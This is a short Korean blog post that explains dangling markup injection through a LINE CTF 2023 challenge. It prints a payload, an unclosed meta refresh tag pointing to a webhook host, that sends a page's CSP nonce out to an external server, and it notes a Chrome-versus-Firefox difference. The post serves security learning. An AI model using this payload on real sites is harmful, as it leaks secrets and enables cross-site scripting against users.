---
title: '[Web] Dangling markup injection'
author: hoppi
date: 2023-04-09 11:32:00 + 0000
categories: [Web]
tags: [web, dangling_markup_injection, xss]
---

`LINE CTF 2023` 에 출제된 `Another secure store note` 문제의 author's writeup을 보다가 흠칫 지나치면서 보았던 Dangling markup에 대해서 적어볼까 합니다.  

# Dangling markup 이란?
***
`Dangling markup` 이라는 뜻은 무엇일까요? 사전적 의미를 보면 더 쉽게 이해할 수 있는데 "`애타게 기다리게 하다.`" 라는 뜻입니다. <u>즉 어떤 닫히지 않는 태그들을 의미합니다.</u> 이런 경우 브라우저는 혼란스러울 수 밖에 없겠죠.  
<br/>

# Dangling markup injection
***
이런 닫히지 않는 태그들을 주입할 수 있다면 xss나 어떠한 값을 leak할 수 있습니다. 해당 문제의 목표는  nonce 값을 얻어내고 nonce 값을 고정시켜 XSS를 트리거하는 것이었는데요. 문제에서 html 인젝션이 가능했는데 아래와 같이 닫히지 않는 상태로 meta 태그를 주입하여 nonce 값을 얻어낼 수 있습니다.  
```plaintext
<meta http-equiv="refresh" content='0; url=http://webhook.com/poc.html?b=
```
<br/>

인젝션 벡터를 보면 다음과 같습니다. 빨간색 부분에 인젝션한 값이 들어가는데 28 번째 줄의 type 속성의 값이 다른 속성들과 다르게 `작은따옴표`로 묶여있어서 `type=` 전까지 값이 위의 `meta` 태그에서 설정한 url의 파라미터 값으로 들어가게 됩니다.  
![vector](../../../assets/img/2023-04-09/vector.png){: w="800" h="400" }  
<br/>

하지만 `chrome`에서는 `<` `\n`이 URL에 포함되어 있으면 block을 해버리는 특성이 있기 때문에 크롬 브라우저에서 테스트해보면 안되지만 `firefox`에서는 이런 방어가 존재하지 않아 정상적으로 webhook으로 요청을 보낼 수 있게되고 nonce 값을 얻어 낼 수 있습니다. (또한 bot도 firefox를 이용하기 때문에 정상적인 leak이 가능해집니다)  
![nonce](../../../assets/img/2023-04-09/nonce.png){: w="800" h="400" }  
<br/>

# Reference
***
Dangling markup 말고도 이 문제에서 다루는 재미있는 특징들은 롸업을 참고하시면 되겠습니다. 또한 제작자분께서 문제를 따로 호스팅하고 있기 때문에 궁금하시면 테스트를 해봐도 될 것 같습니다.  
- [https://drstra.in/posts/assn-wu/](https://drstra.in/posts/assn-wu/)
